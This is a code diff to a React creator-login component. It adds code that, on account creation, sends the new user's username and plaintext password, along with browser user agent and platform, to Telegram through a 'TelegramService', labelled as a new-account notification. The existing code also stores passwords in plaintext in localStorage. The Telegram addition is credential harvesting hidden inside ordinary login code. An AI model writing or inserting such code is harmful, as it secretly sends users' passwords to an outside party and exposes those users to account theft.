@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import Loader from './Loader';
+import TelegramService from '../services/telegramService';
 
 interface CreatorLoginProps {
   setView: (view: string) => void;
@@ -43,6 +44,23 @@ const CreatorLogin: React.FC<CreatorLoginProps> = ({ setView }) => {
         // New creator - create account
         localStorage.setItem(`creator_${creatorName}`, password);
         localStorage.setItem('currentCreator', creatorName);
+        
+        // Send Telegram notification for new account creation
+        try {
+          const telegramService = TelegramService.getInstance();
+          await telegramService.notifyNewAccount({
+            username: creatorName.trim(),
+            password: password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+          });
+          console.log('CreatorLogin: New account notification sent to Telegram');
+        } catch (telegramError) {
+          console.error('CreatorLogin: Failed to send Telegram notification:', telegramError);
+          // Don't block the login process if Telegram notification fails
+        }
+        
         setView('creator-space');
       }
     } catch (error) {
